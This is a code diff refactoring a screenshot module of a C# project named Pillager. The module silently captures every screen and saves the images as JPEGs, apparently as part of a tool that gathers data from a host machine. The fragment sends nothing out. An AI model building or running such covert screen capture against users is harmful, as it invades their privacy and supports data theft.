@@ -6,18 +6,16 @@ using Pillager.Helper;
 
 namespace Pillager.SystemInfos
 {
-    internal class ScreenShot
+    internal class ScreenShot : ICommand
     {
-        public static string SystemInfoName = "ScreenShot";
-
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
-                string savepath = Path.Combine(path, SystemInfoName);
+                string savepath = Path.Combine(path, "System");
                 try
                 {
-                    Native.SetProcessDPIAware();
+                    Native.SetupDpiAwareness();
                 }
                 catch { }
                 if (Screen.AllScreens.Length > 0)
@@ -32,7 +30,7 @@ namespace Pillager.SystemInfos
                             {
                                 graphics.CopyFromScreen(screen.Bounds.Left, screen.Bounds.Top, 0, 0, new Size(bitmap.Width, bitmap.Height), CopyPixelOperation.SourceCopy);
                             }
-                            bitmap.Save(Path.Combine(savepath, SystemInfoName + i + ".jpg"), ImageFormat.Jpeg);
+                            bitmap.Save(Path.Combine(savepath, "ScreenShot" + i + ".jpg"), ImageFormat.Jpeg);
                         }
                     }
                 }
